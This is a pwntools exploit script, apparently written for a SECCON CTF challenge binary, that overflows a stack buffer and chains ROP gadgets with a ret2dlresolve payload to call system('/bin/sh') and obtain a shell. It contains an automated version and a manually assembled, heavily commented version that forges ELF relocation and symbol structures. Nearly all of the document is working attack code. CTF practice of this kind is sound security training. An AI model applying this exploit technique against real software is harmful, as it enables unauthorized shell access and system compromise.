import pwn
elf = pwn.context.binary = pwn.ELF("./chall")
pwn.context.terminal = ['tmux', 'splitw', '-h']
if pwn.args.GDB:
    io = pwn.gdb.debug("./chall", gdbscript='c\n')
elif pwn.args.REMOTE:
    io = pwn.remote("hiyoko.quals.seccon.jp", 9001)
else:
    io = elf.process()
ret = 0x000000000040101a
pwn.context.update(os='linux', arch='amd64')
rop = pwn.ROP(elf)
dlresolve = pwn.Ret2dlresolvePayload(elf, symbol='system', args=[
                                     "/bin/sh"], data_addr=0x404030)
rop.call('gets', [dlresolve.data_addr])
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
pwn.log.info(rop.dump())
io.sendline(pwn.fit({0x88: pwn.p64(ret)+raw_rop}))
io.sendline(dlresolve.payload)


def ret2dlresolve_manual():
    data_addr = 0x404030

    # The section addresses we need to know
    # symtab and strtab give me NULL with readelf and get_section_by_name
    # I do not know why rela plt works
    # they're both defined in the .dynamic section so I don't know the difference
    pwn.log.info(f'elf address: {hex(elf.address)}')
    pwn.log.info(f'elf load address: {hex(elf.load_addr)}')
    relaplt = elf.get_section_by_name('.rela.plt').header.sh_addr
    symtab = elf.dynamic_value_by_tag("DT_SYMTAB")
    strtab = elf.dynamic_value_by_tag("DT_STRTAB")

    pwn.log.info(f'.rela.plt (DT_JMPREL): {hex(relaplt)}')
    pwn.log.info(f'.symtab: {hex(symtab)}')
    pwn.log.info(f'.strtab: {hex(strtab)}')
    print(hex(data_addr - relaplt))
    print((data_addr - relaplt) % 0x18)
    # const PLTREL *const reloc = (const void *) (JMPREL + reloc_offset);
    # Searches in .rela.plt for the corresponding Elf64_Rel
    # reloc offset is reloc_arg * 0x18
    # reloc_arg is what we will push to the stack, as argument to _dl_fixup
    # Elf64_Rel is 0x18 aligned for some reason, even though it is 0x10 bytes long
    assert (data_addr - relaplt) % 0x18 == 0, 'Needs 0x18 alignment!'
    reloc_arg = pwn.p64((data_addr - relaplt) // 0x18)

    # We will place a fake Elf64_Rel struct in data_addr.
    # r_offset contains the destination address for the relocation.
    # Where the libc address of the requested function will be saved.
    # Normally the got.
    # I guess you could make it point to a readable area for a leak if you ever need it.
    # It seems redundant with ret2dl at disposal but who knows.
    # r_info is used as symbol table index (most important 32 bits),
    # 32 bits = We might have problems if data_addr is really far away from symtab.
    # The other 32 bits are used to indicate relocation type.
    # We want it to be set to 7, otherwise the sanity check fails.
    # It has to be ELF_MACHINE_JMP_SLOT, which means plt relocation type.
    # const ElfW(Sym) *sym = &symtab[reloc->r_info >> 32]
    # Elf64_Sym is also 0x18 aligned
    r_offset = pwn.p64(data_addr)
    relocation_type = 7
    print((data_addr + 0x18 - symtab) % 0x18)
    assert (data_addr + 0x18 - symtab) % 0x18 == 0, 'Needs 0x18 alignment!'
    symtab_index = (data_addr + 0x18 - symtab) // 0x18
    r_info = pwn.p64((symtab_index << 32) | relocation_type)
    elf64_rel = r_offset + r_info + b'a'*8

    # Now we define the Elf64_Sym we pointed to earlier
    # st_name is the index of the string symbol from strtab
    # So this is very important, it's the name of the function we want to call
    # There's no alignment to be done for it
    # st_info is used to check for indirect functions. STT_GNU_IFUNC	10
    # I verified that setting st_info = 10 breaks the exploit.
    # I don't actually have any idea how ifuncs differ under the hood.
    # st_other contains a VISIBILITY flag inside of it.
    # Should be the 2 least important bits (sym->st_other & 0x03)
    # These have to be set to 0, otherwise it means that the symbol was already resolved.
    # So we just set the whole thing to 0.
    # st_shndx is the 'section index' of the symbol?
    # something really weird and scary that I do not want to understand.
    # It does not seem to be used by dl-runtime.c anyway...
    # st_value is the 'value' of the symbol. Again, no idea.
    # st_size is supposed to be the symbol length? With 0 = unknown
    # Although it does not seem to be used in dl-runtime.c
    # And changing its value does not affect the exploit
    st_name = pwn.p32(data_addr + 0x30 - strtab)
    st_info = pwn.p8(0)  # do not set to 10 lol
    st_other = pwn.p8(0x0)  # Needed to pass a check
    st_shndx = pwn.p16(0x0)  # Irrelevant?
    st_value = pwn.p64(0x0)  # Irrelevant?
    st_size = pwn.p64(0x0)  # Irrelevant? 0 = symbol size unknown
    elf64_sym = st_name + st_info + st_other + st_shndx + st_value + st_size

    # After this we'll have the symbol string.
    # Next to it I'm putting the bin sh string too,
    # which we will use as argument for system.
    func = b'system\x00'
    arg = b'/bin/sh\x00'
    binsh_addr = data_addr + 0x30 + len(func)

    payload = elf64_rel + elf64_sym + func + arg

    # Defining the rop
    # Write data on data_addr
    rop = pwn.ROP(elf)
    rop.call('gets', [data_addr])

    # The call to the default plt stub
    # We set parameters as normal, as if we are really calling system,
    # After it gets resolved the registers will be restored, rdi included
    # In 32bit I guess it works automatically thanks to the stack
    rop.call(0x401020, [binsh_addr])
    raw_rop = rop.chain()
    pwn.log.info(rop.dump())

    # Send the rop and reloc_arg, with an additional ret for stack alignment
    # You may have to remove the ret, it depends on the machine.
    # This is so that it works on the challenge server.
    io.sendlineafter('name: ', pwn.fit(
        {0x48: pwn.p64(ret) + raw_rop + reloc_arg}))
    pwn.log.info(f'Reloc Arg: {hex(pwn.u64(reloc_arg))}')

    # Send the relocation and symbol structs, the symbol, and the argument
    pwn.log.info(
        f'Sending dlresolve payload at address {hex(data_addr)}:\n{pwn.hexdump(payload)}')
    io.sendline(payload)

    # Get shell
    io.interactive()


# ret2dlresolve_manual()
io.interactive()
